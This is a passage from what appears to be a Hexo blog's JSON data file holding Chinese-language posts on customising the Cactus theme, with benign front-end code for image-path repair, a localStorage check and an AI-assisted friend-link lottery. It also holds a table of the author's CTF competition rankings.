class=\"string\">&quot;studyIn&quot;</span>).<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, randomStudyIn)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"图裂修复\"><a href=\"#图裂修复\" class=\"headerlink\" title=\"图裂修复\"></a>图裂修复</h3><p>这个似乎是hexo的特性，网上的解决方法好像都要额外下载内容，我就不！反正图片已经被移动到正确的地方了，那我就写一个JavaScript修复就是了嘛</p>\n<p>就目前而言一切正常，可以放心食用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 修复图炸的情况</span></span><br><span class=\"line\">(<span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>(...<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&#x27;img&#x27;</span>))).<span class=\"title function_\">forEach</span>(</span><br><span class=\"line\">    <span class=\"function\"><span class=\"params\">img</span>=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(img.<span class=\"property\">src</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>)[<span class=\"number\">3</span>]!=<span class=\"string\">&#x27;images&#x27;</span>&amp;&amp;!img.<span class=\"property\">src</span>.<span class=\"title function_\">startsWith</span>(location.<span class=\"property\">href</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&quot;#&quot;</span>)[<span class=\"number\">0</span>]))&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`&quot;<span class=\"subst\">$&#123;<span class=\"built_in\">decodeURI</span>(img.src.split(<span class=\"string\">&#x27;/&#x27;</span>).slice(-<span class=\"number\">1</span>))&#125;</span>&quot; 貌似炸了`</span>)</span><br><span class=\"line\">            img.<span class=\"property\">src</span>=img.<span class=\"property\">src</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">slice</span>(-<span class=\"number\">1</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>前面的提示的路径也是动态生成的</p>\n<p>又小小的更新一下（2026-1-3），加了一个<code>decodeURI</code>解码<code>%xx</code>，使log更像人类（bushi</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"quote\">&gt; 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用</span></span><br><span class=\"line\"><span class=\"quote\">&gt; </span></span><br><span class=\"line\"><span class=\"quote\">&gt; 如果图炸了的话请手动拼接URL，为</span></span><br><span class=\"line\"><span class=\"quote\">&gt;</span></span><br><span class=\"line\"><span class=\"quote\">&gt; <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;urlNow&quot;</span>&gt;</span></span><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span>image-编号.png</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\">  document.getElementById(&quot;urlNow&quot;).innerText = location.href.split(&#x27;#&#x27;)[0]</span><br><span class=\"line\">  document.getElementById(&quot;urlNow&quot;).innerText += location.href.split(&#x27;#&#x27;)[0].slice(-1)===&#x27;/&#x27;?&#x27;&#x27;:&#x27;/&#x27;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>至于为什么是<code>image-编号.png</code>，是因为在VSCode的Markdown编辑器里粘贴图片的默认命名就是这个，还是要以实际为准</p>\n<h2 id=\"2026-1\"><a href=\"#2026-1\" class=\"headerlink\" title=\"2026.1\"></a>2026.1</h2><h3 id=\"back按钮\"><a href=\"#back按钮\" class=\"headerlink\" title=\"back按钮\"></a>back按钮</h3><p>突然想捣腾一下小站了，把back按钮使用sessionStorage存储，这下不至于在同一页的锚点上来回跳了，<br>但是这样的操作成功地往浏览器自己的History里面拉了一坨大的：每次点back会被认为是一次“新页面”</p>\n<p>综合考虑下，打算给自己的网页加一个FeatureConfig页</p>\n<h3 id=\"FeatureConfig页\"><a href=\"#FeatureConfig页\" class=\"headerlink\" title=\"FeatureConfig页\"></a>FeatureConfig页</h3><p>说搞就搞！</p>\n<p>首先在首页加一个Feature按钮，找到面包条在<code>_partial/header.ejs</code>里生成</p>\n<p><img src=\"/image0.png\"></p>\n<p>面包条的内容来源于theme的config，进去修改，并且__应该是翻译函数，所以为了用不到的i18n，改一下对应翻译的内容</p>\n<p><img src=\"/image.png\"></p>\n<p><img src=\"/image-1.png\"></p>\n<p><img src=\"/image-2.png\"></p>\n<p>然后<code>hexo g &amp;&amp; hexo s</code>一下看看效果</p>\n<p><img src=\"/image-3.png\"></p>\n<p><img src=\"/image-4.png\"></p>\n<p>好！接下来就是添加可选的特性了！</p>\n<p>特性依旧使用localStorage存储</p>\n<p>先来一个<code>localStorage</code>检测</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;support-storage&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;unknow&quot;</span>&gt;</span>正在检测你的浏览器是否支持localStorage……🔎<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">    <span class=\"selector-class\">.unknow</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"built_in\">hsla</span>(<span class=\"number\">54</span>, <span class=\"number\">88%</span>, <span class=\"number\">24%</span>, <span class=\"number\">1.00</span>) solid;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">color</span>: <span class=\"built_in\">hsla</span>(<span class=\"number\">54</span>, <span class=\"number\">88%</span>, <span class=\"number\">24%</span>, <span class=\"number\">1.00</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">background-color</span>: <span class=\"built_in\">hsla</span>(<span class=\"number\">54</span>, <span class=\"number\">90%</span>, <span class=\"number\">85%</span>, <span class=\"number\">1.00</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">width</span>: fit-content;</span></span><br><span class=\"line\"><span class=\"language-css\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">    <span class=\"selector-class\">.support</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#077207</span> solid;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">color</span>: <span class=\"number\">#077207</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#b4fbb4</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">width</span>: fit-content;</span></span><br><span class=\"line\"><span class=\"language-css\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">    <span class=\"selector-class\">.unsupport</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#720707</span> solid;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">color</span>: <span class=\"number\">#720707</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#fbb4b4</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"attribute\">width</span>: fit-content;</span></span><br><span class=\"line\"><span class=\"language-css\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">test</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">try</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">setItem</span>(<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;ok&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">getItem</span>(<span class=\"string\">&#x27;test&#x27;</span>) == <span class=\"string\">&#x27;ok&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">removeItem</span>(<span class=\"string\">&#x27;test&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">return</span> result;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;<span class=\"keyword\">catch</span>(error)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(error);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> result = <span class=\"title function_\">test</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">classList</span>.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;unknow&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">if</span>(result)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">innerText</span> = <span class=\"string\">&#x27;你的浏览器支持localStorage！🎉🎉🎉&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;support&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">innerText</span> = <span class=\"string\">&#x27;你的浏览器好像不支持localStorage！🤔&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;support-storage&#x27;</span>).<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;unsupport&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后加上各部分的代码……（有点多，不放了）</p>\n<p>一通倒腾，搞定了~ <a href=\"/features/\">修改特性传送门</a></p>\n<p>并且为了方便，加了个toc属性，通过<code>layout.ejs</code>里面判断<code>page.toc</code>是否为真来强制显示toc</p>\n<p>希望不要有bug</p>\n<h3 id=\"给图片加边框\"><a href=\"#给图片加边框\" class=\"headerlink\" title=\"给图片加边框\"></a>给图片加边框</h3><p>从背景相似的地方截图根本看不清边界，给所有图片加了一个边框~</p>\n<h3 id=\"修复了一些之前产的史\"><a href=\"#修复了一些之前产的史\" class=\"headerlink\" title=\"修复了一些之前产的史\"></a>修复了一些之前产的史</h3><p>如题，发现于原版Cactus有点不一样，经查发现<code>.light selector</code>无法生效，需替换成</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">selector</span><br><span class=\"line\">    <span class=\"selector-class\">.light</span> &amp;</span><br><span class=\"line\">        ...</span><br></pre></td></tr></table></figure>\n\n<p>并且将desktop版的nav改回了仅在顶部附近显示（这里我发现阈值过小，导致无法重新显示，于是调大了阈值，并且在已经写了这么多NativeJS的情况下发现他竟然有jQuery……）</p>\n<h3 id=\"上线“友链抽奖机”\"><a href=\"#上线“友链抽奖机”\" class=\"headerlink\" title=\"上线“友链抽奖机”\"></a>上线“友链抽奖机”</h3><p><del>虽然一个友链都没有</del> ，但是“友链抽奖机”终于写完了！</p>\n<p>这个抽奖机拥抱AI，因为我实在不想写前端了！用的D老师，效果还不错~</p>\n<p>快去<a href=\"/friends/\">抽友链</a>吧！</p>\n<p>对了，把D老师之前几版也放一下，下面的都是D老师根据提示词自己写出来的~</p>\n<style>\n    details {\n        border: 1px solid;\n        padding: 5px;\n        border-radius: 5px;\n    }\n\n    details:open summary {\n        border-bottom: 1px solid;\n    }\n</style>\n\n<ul>\n<li><a href=\"/friends/draft/ds_v1.html\">V1</a> -&gt; 最原始的简单提示词，看起来不错，就是AI味太大了<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链有几种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、蓝、绿、金、红），旋转由快到慢，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链 分，显示抽到的最高品质的颜色，点击后弹出浮层，显示友链详情和抽到过的品质列表及数量，未抽中的留灰色占位，最后给出一个作弊按钮用来一键解锁所有基础友链。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点</details></li>\n<li><a href=\"/friends/draft/ds_v2.html\">V2</a> -&gt; 让D老师接受我的“现代”审美，至少AI味没有那么大了<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details></li>\n<li><a href=\"/friends/draft/ds_v3.html\">V3</a> -&gt; 从V2的提示词进一步修改，最终版就是从这版上改的<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，用JS实现，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能，点击后弹出浮层，左侧是较大的头像，右上是标题、说明、链接，若超出则显示滚动条，右下留一小条背景稍不同，用倾斜圆角矩形和对应颜色表示某种品质的牌，矩形里数字代表抽到的次数（注意2位数以上字体大小），若未抽到对应品质则背景为灰色、标0，矩形下方给出品质名称，注意间距。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。两个页面写在一起。我像把它加到已有的界面中，尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details></li>\n</ul>\n<p>基于V3，通过反复向D老师提要求+自己修，慢慢地完成了这个“浩大工程”</p>\n<p><img src=\"/image-5.png\" alt=\"alt text\"></p>\n<p>（完全想象不出来自己写这么大托需要多久，我上一个纯手写的HTML前端只有798行41297字符）</p>\n<p>不过D老师还不是万能的，比如旋转动画写不出来，偶尔听不懂人话（不过不排除是上下文过大导致的），最后修改还得是我来做</p>\n<p><span style=\"background-color: currentColor\">听说GPT、Gemini效果很好，不知道长城外的AI怎么样呢？</span></p>\n<h3 id=\"进一步改进“友链抽奖机”\"><a href=\"#进一步改进“友链抽奖机”\" class=\"headerlink\" title=\"进一步改进“友链抽奖机”\"></a>进一步改进“友链抽奖机”</h3><p>突然想到会不会有人把博客名字和介绍写的特别特别长，添加了截断，并且让友链详情的url会自动滚动了！</p>\n<p>然后还加入了友链消失和上新提示，加了一个友链全收集提示</p>\n<p>还加了体力全恢复的时间和对应的时刻</p>\n<p>啊吧啊吧啊吧……</p>\n<script>\n    // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>"},{"title":"我在Cactus的基础上魔改了什么","date":"2025-10-30T09:20:03.000Z","_content":"\n第一次搭博客，发现cactus这个主题简洁美观，但是有几点不是很满意，小小魔改一下\n\n## 1 亮/暗双主题适配\n\n为了同时加入亮/暗主题，我往css文件夹里面拉了一坨大的，先写死明暗两种配色，然后给所有颜色相关的字段都加上了.night/.light，接下来修改head.ejs和layout.ejs来支持localStorage存储明暗和手动切换按钮\n\n## 2 增加了左上角的返回\n\n感觉左上有logo更有感觉，就在layout.ejs里面加了这个部分\n\n## 3 加了一个返回按钮\n\n不知道有什么用，但我就觉得应该有这么一个按钮！\n\n## 4 把字体调大了一点\n\n还是字大更舒服\n\n~~水不下去了，就这样吧~~\n\n## Update\n\n果然出问题了，早预想到手机预览不好，但是不想适配\n\n然后about的内容忘记改了😅，看来不修一修是不行了\n\n先是把about的排版纠正了一下，然后加了媒体查询把左上角那个东西藏起来/改变样式\n\n希望不要有新的bug了😭\n","source":"_posts/我在Cactus的基础上魔改了什么.md","raw":"---\ntitle: 我在Cactus的基础上魔改了什么\ndate: 2025-10-30 17:20:03\ntags:\n---\n\n第一次搭博客，发现cactus这个主题简洁美观，但是有几点不是很满意，小小魔改一下\n\n## 1 亮/暗双主题适配\n\n为了同时加入亮/暗主题，我往css文件夹里面拉了一坨大的，先写死明暗两种配色，然后给所有颜色相关的字段都加上了.night/.light，接下来修改head.ejs和layout.ejs来支持localStorage存储明暗和手动切换按钮\n\n## 2 增加了左上角的返回\n\n感觉左上有logo更有感觉，就在layout.ejs里面加了这个部分\n\n## 3 加了一个返回按钮\n\n不知道有什么用，但我就觉得应该有这么一个按钮！\n\n## 4 把字体调大了一点\n\n还是字大更舒服\n\n~~水不下去了，就这样吧~~\n\n## Update\n\n果然出问题了，早预想到手机预览不好，但是不想适配\n\n然后about的内容忘记改了😅，看来不修一修是不行了\n\n先是把about的排版纠正了一下，然后加了媒体查询把左上角那个东西藏起来/改变样式\n\n希望不要有新的bug了😭\n","slug":"我在Cactus的基础上魔改了什么","published":1,"updated":"2025-10-30T12:08:46.273Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3t0008h4vb1paq7hcv","content":"<p>第一次搭博客，发现cactus这个主题简洁美观，但是有几点不是很满意，小小魔改一下</p>\n<h2 id=\"1-亮-暗双主题适配\"><a href=\"#1-亮-暗双主题适配\" class=\"headerlink\" title=\"1 亮&#x2F;暗双主题适配\"></a>1 亮&#x2F;暗双主题适配</h2><p>为了同时加入亮&#x2F;暗主题，我往css文件夹里面拉了一坨大的，先写死明暗两种配色，然后给所有颜色相关的字段都加上了.night&#x2F;.light，接下来修改head.ejs和layout.ejs来支持localStorage存储明暗和手动切换按钮</p>\n<h2 id=\"2-增加了左上角的返回\"><a href=\"#2-增加了左上角的返回\" class=\"headerlink\" title=\"2 增加了左上角的返回\"></a>2 增加了左上角的返回</h2><p>感觉左上有logo更有感觉，就在layout.ejs里面加了这个部分</p>\n<h2 id=\"3-加了一个返回按钮\"><a href=\"#3-加了一个返回按钮\" class=\"headerlink\" title=\"3 加了一个返回按钮\"></a>3 加了一个返回按钮</h2><p>不知道有什么用，但我就觉得应该有这么一个按钮！</p>\n<h2 id=\"4-把字体调大了一点\"><a href=\"#4-把字体调大了一点\" class=\"headerlink\" title=\"4 把字体调大了一点\"></a>4 把字体调大了一点</h2><p>还是字大更舒服</p>\n<p><del>水不下去了，就这样吧</del></p>\n<h2 id=\"Update\"><a href=\"#Update\" class=\"headerlink\" title=\"Update\"></a>Update</h2><p>果然出问题了，早预想到手机预览不好，但是不想适配</p>\n<p>然后about的内容忘记改了😅，看来不修一修是不行了</p>\n<p>先是把about的排版纠正了一下，然后加了媒体查询把左上角那个东西藏起来&#x2F;改变样式</p>\n<p>希望不要有新的bug了😭</p>\n","excerpt":"","more":"<p>第一次搭博客，发现cactus这个主题简洁美观，但是有几点不是很满意，小小魔改一下</p>\n<h2 id=\"1-亮-暗双主题适配\"><a href=\"#1-亮-暗双主题适配\" class=\"headerlink\" title=\"1 亮&#x2F;暗双主题适配\"></a>1 亮&#x2F;暗双主题适配</h2><p>为了同时加入亮&#x2F;暗主题，我往css文件夹里面拉了一坨大的，先写死明暗两种配色，然后给所有颜色相关的字段都加上了.night&#x2F;.light，接下来修改head.ejs和layout.ejs来支持localStorage存储明暗和手动切换按钮</p>\n<h2 id=\"2-增加了左上角的返回\"><a href=\"#2-增加了左上角的返回\" class=\"headerlink\" title=\"2 增加了左上角的返回\"></a>2 增加了左上角的返回</h2><p>感觉左上有logo更有感觉，就在layout.ejs里面加了这个部分</p>\n<h2 id=\"3-加了一个返回按钮\"><a href=\"#3-加了一个返回按钮\" class=\"headerlink\" title=\"3 加了一个返回按钮\"></a>3 加了一个返回按钮</h2><p>不知道有什么用，但我就觉得应该有这么一个按钮！</p>\n<h2 id=\"4-把字体调大了一点\"><a href=\"#4-把字体调大了一点\" class=\"headerlink\" title=\"4 把字体调大了一点\"></a>4 把字体调大了一点</h2><p>还是字大更舒服</p>\n<p><del>水不下去了，就这样吧</del></p>\n<h2 id=\"Update\"><a href=\"#Update\" class=\"headerlink\" title=\"Update\"></a>Update</h2><p>果然出问题了，早预想到手机预览不好，但是不想适配</p>\n<p>然后about的内容忘记改了😅，看来不修一修是不行了</p>\n<p>先是把about的排版纠正了一下，然后加了媒体查询把左上角那个东西藏起来&#x2F;改变样式</p>\n<p>希望不要有新的bug了😭</p>\n"},{"title":"此前的比赛战绩","date":"2025-10-30T08:21:11.000Z","_content":"\n在进队之前没打几场比赛，但是还是列一下吧\n\n|比赛名称|比赛情况|比赛成绩|\n|:-----:|:-----:|:------:|\n|MoeCTF2025|完赛|#2 17900pts|\n|CBCTF2025|写了几天，完赛|#18 7,739.86pts|\n|Newstar2025|中途咕咕咕，完赛|#80 2247pts|\n|SUSCTF2025|完赛|#34 772pts|\n|0xGame2025|完赛|#4 25350pts|\n|TSCTF-J2025|完赛|#6 10351pts|\n|GeekGame2025|完赛|#174 663pts|\n","source":"_posts/此前的比赛战绩.md","raw":"---\ntitle: 此前的比赛战绩\ndate: 2025-10-30 16:21:11\ntags:\n---\n\n在进队之前没打几场比赛，但是还是列一下吧\n\n|比赛名称|比赛情况|比赛成绩|\n|:-----:|:-----:|:------:|\n|MoeCTF2025|完赛|#2 17900pts|\n|CBCTF2025|写了几天，完赛|#18 7,739.86pts|\n|Newstar2025|中途咕咕咕，完赛|#80 2247pts|\n|SUSCTF2025|完赛|#34 772pts|\n|0xGame2025|完赛|#4 25350pts|\n|TSCTF-J2025|完赛|#6 10351pts|\n|GeekGame2025|完赛|#174 663pts|\n","slug":"此前的比赛战绩","published":1,"updated":"2026-01-02T18:58:39.906Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3u0009h4vbcb52e99o","content":"<p>在进队之前没打几场比赛，但是还是列一下吧</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">比赛名称</th>\n<th align=\"center\">比赛情况</th>\n<th align=\"center\">比赛成绩</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">MoeCTF2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#2 17900pts</td>\n</tr>\n<tr>\n<td align=\"center\">CBCTF2025</td>\n<td align=\"center\">写了几天，完赛</td>\n<td align=\"center\">#18 7,739.86pts</td>\n</tr>\n<tr>\n<td align=\"center\">Newstar2025</td>\n<td align=\"center\">中途咕咕咕，完赛</td>\n<td align=\"center\">#80 2247pts</td>\n</tr>\n<tr>\n<td align=\"center\">SUSCTF2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#34 772pts</td>\n</tr>\n<tr>\n<td align=\"center\">0xGame2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#4 25350pts</td>\n</tr>\n<tr>\n<td align=\"center\">TSCTF-J2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#6 10351pts</td>\n</tr>\n<tr>\n<td align=\"center\">GeekGame2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#174 663pts</td>\n</tr>\n</tbody></table>\n","excerpt":"","more":"<p>在进队之前没打几场比赛，但是还是列一下吧</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">比赛名称</th>\n<th 